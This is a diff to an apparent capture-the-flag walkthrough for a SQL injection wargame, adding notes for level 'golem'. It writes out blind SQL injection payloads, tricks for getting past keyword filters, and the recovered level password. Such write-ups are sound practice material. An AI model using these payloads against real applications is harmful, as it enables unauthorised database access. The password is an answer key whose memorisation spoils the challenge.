@@ -64,6 +64,14 @@ level-10 (skeleton):
   -> the level is cleared.
 
 level-11 (golem):
+  -> inspect the page and add a parameter named pw.
+  -> where pw=' || id LIKE 'admin' && length(pw)<8-- . (we can use LIKE instead of "=" since = is blocked)
+  -> now let pw=' || id LIKE 'admin' && substring(pw,1,1) LIKE '7'-- .(substr is blocked but not substring)
+  -> bruteforce and get the password.
+  -> now pw=77d6290b
+  -> th level is cleared..
+
+level-12 (darkknight):
   -> 
 
 
